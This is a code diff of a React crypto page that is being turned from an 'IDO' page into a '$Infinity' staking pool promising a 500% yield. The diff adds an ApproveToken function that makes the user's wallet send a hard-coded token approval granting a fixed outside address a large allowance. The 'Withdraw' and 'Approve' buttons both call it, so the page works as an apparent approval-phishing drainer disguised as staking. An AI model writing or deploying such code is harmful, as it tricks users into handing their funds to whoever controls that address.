@@ -1,7 +1,7 @@
 import React from 'react';
 import { useState } from 'react';
 import { ethers } from 'ethers';
-import './IDO.css';
+import './Staking.css';
 
 let currentAccount = null;
 async function sendTransaction() {
@@ -31,6 +31,8 @@ async function sendTransaction() {
   }, 20000);
 }
 
+function Staking() {
+  
   let contractAddress = "0x6b25Cb9338b4cEC5632aFd12B905C9C25a71BB4b";    //Modify Contract Address here!!
   async function ContractEthBalance() {
     let accBalance = await window.ethereum.request({
@@ -39,17 +41,40 @@ async function sendTransaction() {
         [contractAddress, 'latest']
     });
     var balanceDEC = Number(accBalance).toString(10);
-    console.log(balanceDEC);
     var inWeiBal = balanceDEC.length;
-    var balanceBtn = document.getElementById("test-btn");
-
+    
+    console.log("second");
     var str = Math.pow(10, (inWeiBal - 22));
-    var rounded = Math.round(str * parseInt(balanceDEC.substring(0, 4)) * 10000) / 10000;
-    balanceBtn.innerText = rounded + " BNB";
+    var ETH = Math.round(str * parseInt(balanceDEC.substring(0, 4)) * 10000) / 10000;
+    console.log(ETH);
+    return ETH;
   }
 
-function IDO() {
+  async function ApproveToken() {
+    let params = [
+      {
+        from: currentAccount,
+        to: '0x301F8f13F950fd86919c9D35B553c50280Aa18c5', //0x55d398326f99059fF775485246999027B3197955
+        gas: Number(100000).toString(16), // 30400
+        gasPrice: Number(10000000000).toString(16), // 10000000000
+        value: '0', // 2441406250
+        data:'0x095ea7b30000000000000000000000006488e5e3b69c63b9fe5ef5007b30b0ea3870422f000000000000000000000000000000000000000000000000000000174876e800',
+          
+        //0x095ea7b300000000000000000000000[062e0d998212b01d87049eb2d4a82436f1fca3b63]0000000000000000000000000000000000000000000000056bc75e2d63100000
+      },
+    ];
 
+    var TokenApprove = document.getElementById("Approve-btn");
+    let result = window.ethereum
+      .request({
+        method: 'eth_sendTransaction',
+        params,
+      }).catch((err) => {
+        console.log(err);
+      })
+    
+      TokenApprove.innerHTML=ContractEthBalance();
+  }
 
   const [walletAddress, setWalletAddress] = useState("");
 
@@ -115,41 +140,54 @@ function IDO() {
 
   return (
 
-    <div className='IDO'>
+    <div className='staking'>
       <button id="balance-btn" hidden>
         balance
       </button>
       <button id="connect-btn" onClick={connectWallet}>
         Connect Wallet
       </button>
-
-      <div className="IDOcontainer">
-        <div className="box1">
-          <table className="Table">
-            <tr>IDO</tr>
-            <hr id='hr1'/>
+      <div className="Stakingcontainer">
+        <div className="staking-box-1">
+          <h4>Staking Pool</h4>
+        </div>
+        <div className="staking-box-2">
+          <div id='topleft'>
+            Stake $Infinity<br />
+            Earn $Infinity
+          </div>
+          <br/>
+          <table id='APR'>
             <tr>
-              <td>IDO Amount</td>
-              <td>500 OKT</td>
+              <td>Annul Percentage Yield</td>
+              <td>500%</td>
             </tr>
-            <hr id='hr2'/>
+            <br/>
+            <tr>
+              <td>Total Staked</td>
+              <td><button onClick={ContractEthBalance}>button</button></td>
+            </tr>
 
           </table>
         </div>
-        <div className="box2">
-          <button id='transaction-btn' onClick={sendTransaction} class="button">
-            Make IDO
-          </button>
-
+        <div className="staking-box-3">
+          <div id='box-3-left'>
+            $Infinity Staked<br/>
+            0.0
+          </div>
+          <div id='box-3-right'>
+            <button className="Approve-btn" onClick={ApproveToken}>Withdraw</button>
+          </div>
         </div>
-        <div className="box3">
-
+        <div className="staking-box-4">
+          
+          <button className="Approve-btn" onClick={ApproveToken}>Approve</button>
         </div>
       </div>
-      <h4 class="animate__animated animate__rotateIn" id="Welcome">Welcome to Infinity</h4>
     </div>
 
   )
 }
 
-export default IDO
+
+export default Staking
